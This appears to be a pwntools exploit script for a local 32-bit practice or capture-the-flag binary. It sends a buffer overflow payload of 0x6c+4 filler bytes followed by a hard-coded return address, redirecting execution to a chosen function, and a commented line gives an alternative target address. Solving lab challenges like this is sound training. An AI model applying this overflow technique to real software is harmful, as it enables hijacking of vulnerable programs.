from pwn import *

#context.log_level = "DEBUG"

successful = 0x0804864f
failed = 0x08048661

p = process("./p6_32_0")

p.sendlineafter(" : ", "aaaa")
p.sendlineafter(" : ", "bbbb")

payload = "a"*(0x6c+4)
#payload += "\x3b\x86\x04\x08" # "\x3b\x86\x04\x08" = p32(successful)
payload += p32(failed)

p.sendafter("nicname\n", payload)

p.interactive()
